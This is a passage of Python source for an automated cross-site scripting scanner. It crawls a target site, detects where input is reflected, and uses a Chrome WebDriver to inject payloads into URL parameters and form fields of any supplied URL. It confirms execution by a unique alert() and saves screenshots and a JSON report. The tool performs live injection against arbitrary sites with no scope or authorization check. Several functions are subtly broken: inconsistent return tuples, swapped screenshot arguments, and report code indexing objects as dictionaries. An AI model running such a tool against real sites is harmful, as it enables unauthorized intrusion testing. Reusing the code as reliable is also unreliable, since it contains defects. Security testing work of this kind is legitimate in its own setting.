                                return 'attribute'
                        return 'html'
                
                # Check JavaScript context
                for script in soup.find_all('script'):
                    if test_value in script.string:
                        return 'javascript'
                
                # Check CSS context
                for style in soup.find_all('style'):
                    if test_value in style.string:
                        return 'css'
            
            return 'html'  # Default
        except:
            return 'html'  # Default
    
    def detect_context(self, url, parameter, response):
        """Detect the context where user input is reflected"""
        contexts = []
        
        # Parse the response
        soup = BeautifulSoup(response.content, 'html.parser')
        
        # Check HTML context
        if parameter in response.text:
            # Find where the parameter appears
            for tag in soup.find_all():
                if parameter in str(tag):
                    # Check if it's in an attribute
                    for attr_name, attr_value in tag.attrs.items():
                        if parameter in str(attr_value):
                            contexts.append('attribute')
                            break
                    else:
                        # It's in HTML content
                        contexts.append('html')
        
        # Check JavaScript context
        script_tags = soup.find_all('script')
        for script in script_tags:
            if parameter in script.string:
                contexts.append('javascript')
        
        # Check CSS context
        style_tags = soup.find_all('style')
        for style in style_tags:
            if parameter in style.string:
                contexts.append('css')
        
        # Check URL context
        if parameter in url:
            contexts.append('url')
        
        return contexts if contexts else ['html']  # Default to HTML context
    
    def test_xss_with_chrome(self, url, parameter, payload, context, method='GET'):
        """Test XSS vulnerability using Chrome browser with proper alert handling"""
        if not self.driver:
            logger.warning(f"{Colors.YELLOW}[XSS] Chrome not available, skipping real XSS test{Colors.END}")
            return False, None, None
        
        try:
            # Create unique payload with our identifier
            unique_payload = payload.replace('alert("XSS")', f'alert("{self.unique_alert_id}")')
            unique_payload = unique_payload.replace("alert('XSS')", f"alert('{self.unique_alert_id}')")
            
            # Prepare the test URL or data
            if method == 'GET':
                # For GET requests, modify the URL
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                query_params[parameter] = [unique_payload]
                
                # Rebuild URL
                new_query = urllib.parse.urlencode(query_params, doseq=True)
                test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
                
                logger.info(f"{Colors.CYAN}[XSS] Testing GET: {test_url}{Colors.END}")
                
                # Navigate to the URL
                self.driver.get(test_url)
                
            else:
                # For POST requests, navigate to form page first
                self.driver.get(url)
                
                # Find the form and fill it
                forms = self.driver.find_elements(By.TAG_NAME, "form")
                if forms:
                    form = forms[0]
                    
                    # Find input field
                    input_field = form.find_element(By.NAME, parameter)
                    input_field.clear()
                    input_field.send_keys(unique_payload)
                    
                    # Submit form
                    form.submit()
                    time.sleep(2)  # Wait for form submission
                
                test_url = self.driver.current_url
            
            # Wait for page to load
            time.sleep(3)
            
            # Check for alert popup with our unique identifier
            try:
                alert = self.driver.switch_to.alert
                alert_text = alert.text
                
                # Check if it's our unique alert
                if self.unique_alert_id in alert_text:
                    # Take screenshot BEFORE closing alert
                    screenshot_path = self.capture_screenshot(test_url, parameter, payload)
                    alert.accept()  # Close the alert
                    logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Our unique alert detected: {alert_text}{Colors.END}")
                    return True, test_url, alert_text, screenshot_path
                else:
                    # It's not our alert, dismiss it and continue
                    alert.accept()
                    logger.info(f"{Colors.YELLOW}[XSS] Alert detected but not ours: {alert_text}{Colors.END}")
                
            except NoAlertPresentException:
                # No alert found, check if payload is reflected
                page_source = self.driver.page_source
                if unique_payload in page_source:
                    # Check if it's in executable context
                    if self.check_executable_context(page_source, unique_payload, context):
                        # Take screenshot for reflected payload
                        screenshot_path = self.capture_screenshot(test_url, parameter, payload)
                        logger.info(f"{Colors.GREEN}[XSS] SUCCESS! Payload reflected in executable context{Colors.END}")
                        return True, test_url, "Reflected in context", screenshot_path
                
                return False, test_url, None, None
                
        except Exception as e:
            logger.error(f"{Colors.RED}[XSS] Error testing with Chrome: {str(e)}{Colors.END}")
            return False, None, None, None
    
    def check_executable_context(self, page_source, payload, context):
        """Check if payload is in executable context"""
        soup = BeautifulSoup(page_source, 'html.parser')
        
        if context == 'html':
            # Check for script tags or event handlers
            return '<script>' in payload or 'on' in payload or '<img' in payload
        elif context == 'attribute':
            # Check for event handlers
            return 'on' in payload and '=' in payload
        elif context == 'javascript':
            # Check for JavaScript syntax
            return 'alert(' in payload or 'console.log(' in payload
        elif context == 'css':
            # Check for CSS expressions
            return 'expression(' in payload or 'url(' in payload
        elif context == 'url':
            # Check for JavaScript or data protocols
            return 'javascript:' in payload or 'data:' in payload
        
        return False
    
    
    def capture_screenshot(self, url, payload, parameter):
        """Capture screenshot of the XSS vulnerability after successful execution"""
        if not self.driver:
            logger.warning(f"{Colors.YELLOW}[SCREENSHOT] WebDriver not available{Colors.END}")
            return None
        
        try:
            # Generate filename
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f"xss_poc_{timestamp}_{hashlib.md5(url.encode()).hexdigest()[:8]}.png"
            
            # Take screenshot of current page (should show the XSS execution)
            self.driver.save_screenshot(filename)
            
            logger.info(f"{Colors.GREEN}[SCREENSHOT] PoC saved: {filename}{Colors.END}")
            return filename
            
        except Exception as e:
            logger.error(f"{Colors.RED}[SCREENSHOT] Error capturing screenshot: {str(e)}{Colors.END}")
            return None
    
    def scan_forms(self):
        """Scan forms for XSS vulnerabilities"""
        logger.info(f"{Colors.BLUE}[XSS] Scanning {len(self.recon_data['forms'])} forms...{Colors.END}")
        
        for form in self.recon_data['forms']:
            logger.info(f"{Colors.CYAN}[FORM] Testing form: {form['action']}{Colors.END}")
            
            for input_field in form['inputs']:
                if input_field['type'] in ['text', 'textarea', 'search', 'email', 'url']:
                    parameter = input_field['name']
                    
                    # Detect context first
                    context = self.detect_form_context(form['action'], parameter)
                    
                    # Get payloads specific to this context
                    payloads = self.generate_payloads_for_context(context)
                    
                    # Test payloads for this specific context using Chrome
                    for payload in payloads[:10]:  # Limit to first 10 payloads for Chrome testing
                        logger.info(f"{Colors.YELLOW}[XSS] Testing payload: {payload[:50]}...{Colors.END}")
                        
                        is_vulnerable, test_url, alert_text, screenshot_path = self.test_xss_with_chrome(
                            form['action'], parameter, payload, context, form['method']
                        )
                        
                        if is_vulnerable:
                            vulnerability = XSSVulnerability(
                                url=form['action'],
                                parameter=parameter,
                                payload=payload,
                                context=context,
                                method=form['method'],
                                test_url=test_url,
                                screenshot=screenshot_path,
                                alert_text=alert_text,
                                severity='High',
                                timestamp=datetime.now().isoformat()
                            )
                            
                            # Screenshot already captured in test_xss_with_chrome
                            
                            self.vulnerabilities.append(vulnerability)
                            
                            logger.info(f"{Colors.GREEN}[VULN] XSS CONFIRMED in {form['action']} parameter: {parameter}{Colors.END}")
                            logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
                            logger.info(f"{Colors.GREEN}[CONTEXT] {context}{Colors.END}")
                            logger.info(f"{Colors.GREEN}[TEST_URL] {test_url}{Colors.END}")
                            if alert_text:
                                logger.info(f"{Colors.GREEN}[ALERT] {alert_text}{Colors.END}")
                            
                            # Break after first successful payload
                            break
                    
                    if is_vulnerable:
                        break
    
    def scan_urls(self):
        """Scan URLs for XSS vulnerabilities"""
        logger.info(f"{Colors.BLUE}[XSS] Scanning {len(self.recon_data['discovered_urls'])} URLs...{Colors.END}")
        
        for url in self.recon_data['discovered_urls']:
            if '?' in url:
                # URL has parameters
                parsed_url = urlparse(url)
                query_params = parse_qs(parsed_url.query)
                
                for parameter in query_params.keys():
                    logger.info(f"{Colors.CYAN}[URL] Testing {url} parameter: {parameter}{Colors.END}")
                    
                    # Detect context first
                    context = self.detect_url_context(url, parameter)
                    
                    # Get payloads specific to this context
                    payloads = self.generate_payloads_for_context(context)
                    
                    # Test payloads for this specific context using Chrome
                    for payload in payloads[:10]:  # Limit to first 10 payloads for Chrome testing
                        logger.info(f"{Colors.YELLOW}[XSS] Testing payload: {payload[:50]}...{Colors.END}")
                        
                        is_vulnerable, test_url, alert_text, screenshot_path = self.test_xss_with_chrome(
                            url, parameter, payload, context, 'GET'
                        )
                        
                        if is_vulnerable:
                            vulnerability = XSSVulnerability(
                                url=url,
                                parameter=parameter,
                                payload=payload,
                                context=context,
                                method='GET',
                                test_url=test_url,
                                screenshot=screenshot_path,
                                alert_text=alert_text,
                                severity='High',
                                timestamp=datetime.now().isoformat()
                            )
                            
                            # Screenshot already captured in test_xss_with_chrome
                            
                            self.vulnerabilities.append(vulnerability)
                            
                            logger.info(f"{Colors.GREEN}[VULN] XSS CONFIRMED in {url} parameter: {parameter}{Colors.END}")
                            logger.info(f"{Colors.GREEN}[PAYLOAD] {payload}{Colors.END}")
                            logger.info(f"{Colors.GREEN}[CONTEXT] {context}{Colors.END}")
                            logger.info(f"{Colors.GREEN}[TEST_URL] {test_url}{Colors.END}")
                            
                            # Break after first successful payload
                            break
                    
                    if is_vulnerable:
                        break
    
    def generate_xss_report(self):
        """Generate XSS vulnerability report"""
        # Convert XSSVulnerability objects to dictionaries
        vulnerabilities_dict = []
        for vuln in self.vulnerabilities:
            vulnerabilities_dict.append({
                'url': vuln.url,
                'parameter': vuln.parameter,
                'payload': vuln.payload,
                'context': vuln.context,
                'method': vuln.method,
                'test_url': vuln.test_url,
                'screenshot': vuln.screenshot,
                'alert_text': vuln.alert_text,
                'severity': vuln.severity,
                'timestamp': vuln.timestamp
            })
        
        report = {
            'scan_info': {
                'target': self.recon_data['target'],
                'timestamp': datetime.now().isoformat(),
                'total_vulnerabilities': len(self.vulnerabilities)
            },
            'vulnerabilities': vulnerabilities_dict
        }
        
        # Save report to file
        with open('xss_report.json', 'w') as f:
            json.dump(report, f, indent=2)
        
        # Print summary
        print(f"\n{Colors.GREEN}{Colors.BOLD}=== XSS SCAN SUMMARY ==={Colors.END}")
        print(f"{Colors.CYAN}Target: {self.recon_data['target']}{Colors.END}")
        print(f"{Colors.CYAN}Vulnerabilities found: {len(self.vulnerabilities)}{Colors.END}")
        
        if self.vulnerabilities:
            print(f"\n{Colors.RED}{Colors.BOLD}VULNERABILITIES:{Colors.END}")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"{Colors.YELLOW}{i}. {vuln['type']} in {vuln['url']}{Colors.END}")
                print(f"   Parameter: {vuln['parameter']}")
                print(f"   Context: {vuln['context']}")
                print(f"   Payload: {vuln['payload']}")
                if 'screenshot' in vuln:
                    print(f"   Screenshot: {vuln['screenshot']}")
                print()
        
        print(f"{Colors.GREEN}Report saved to: xss_report.json{Colors.END}\n")
        
        # Show detailed results
        if self.vulnerabilities:
            print(f"{Colors.RED}{Colors.BOLD}=== CONFIRMED XSS VULNERABILITIES ==={Colors.END}")
            for i, vuln in enumerate(self.vulnerabilities, 1):
                print(f"\n{Colors.YELLOW}{i}. {vuln['type']} in {vuln['url']}{Colors.END}")
                print(f"   Parameter: {vuln['parameter']}")
                print(f"   Context: {vuln['context']}")
                print(f"   Method: {vuln['method']}")
                print(f"   Payload: {vuln['payload']}")
                if 'test_url' in vuln:
                    print(f"   Test URL: {vuln['test_url']}")
                if 'screenshot' in vuln:
                    print(f"   PoC Screenshot: {vuln['screenshot']}")
                print()
        else:
            print(f"{Colors.GREEN}No XSS vulnerabilities found.{Colors.END}")
        
        return report
    
    def cleanup(self):
        """Cleanup resources"""
        if self.driver:
            self.driver.quit()

def main():
    """Main function"""
    if len(sys.argv) != 2:
        print(f"{Colors.RED}Usage: python3 {sys.argv[0]} <target_url>{Colors.END}")
        print(f"{Colors.YELLOW}Example: python3 {sys.argv[0]} https://example.com{Colors.END}")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Phase 1: Deep Reconnaissance
    print(f"{Colors.BLUE}{Colors.BOLD}=== PHASE 1: DEEP RECONNAISSANCE ==={Colors.END}")
    recon = AdvancedReconnaissance(target_url)
    recon.print_banner()
    
    try:
        recon.run_deep_reconnaissance()
        recon_data = recon.generate_report()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INFO] Reconnaissance interrupted by user{Colors.END}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"{Colors.RED}[ERROR] Reconnaissance failed: {str(e)}{Colors.END}")
        sys.exit(1)
    
    # Phase 2: Chrome-Based XSS Testing
    print(f"\n{Colors.BLUE}{Colors.BOLD}=== PHASE 2: CHROME-BASED XSS TESTING ==={Colors.END}")
    print(f"{Colors.MAGENTA}[INFO] Starting Chrome browser for real XSS testing...{Colors.END}")
    print(f"{Colors.MAGENTA}[INFO] Chrome will open and test each payload in real browser{Colors.END}")
    print(f"{Colors.MAGENTA}[INFO] Screenshots will be captured for confirmed vulnerabilities{Colors.END}\n")
    
    scanner = AdvancedXSSScanner(recon_data)
    print(f"{Colors.MAGENTA}[INFO] Unique alert identifier: {scanner.unique_alert_id}{Colors.END}")
    
    try:
        scanner.scan_forms()
        scanner.scan_urls()
        scanner.generate_xss_report()
    except KeyboardInterrupt:
        print(f"\n{Colors.YELLOW}[INFO] XSS scanning interrupted by user{Colors.END}")
    except Exception as e:
        logger.error(f"{Colors.RED}[ERROR] XSS scanning failed: {str(e)}{Colors.END}")
    finally:
        scanner.cleanup()

if __name__ == "__main__":
    main()